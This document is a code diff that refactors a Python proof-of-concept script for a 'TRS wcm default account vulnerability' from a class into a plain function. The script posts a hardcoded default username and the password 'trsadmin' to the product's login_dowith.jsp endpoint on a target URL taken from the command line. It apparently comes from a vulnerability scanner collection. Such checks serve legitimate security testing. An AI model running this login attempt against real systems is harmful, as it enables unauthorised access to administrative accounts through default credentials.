@@ -10,22 +10,15 @@ import sys
 import json
 import requests
 import warnings
-  
-  
-
-class wcm_default_user:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['TRS wcm系统默认账户漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
             "Content-Type":"application/x-www-form-urlencoded",
-            "Referer":self.url+"/wcm/app/login.jsp"
+            "Referer":url+"/wcm/app/login.jsp"
         }
         payload = "/wcm/app/login_dowith.jsp"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         post_data = {
             "UserName":"依申请公开",
             "PassWord":"trsadmin"
@@ -44,5 +37,5 @@ class wcm_default_user:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = wcm_default_user(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
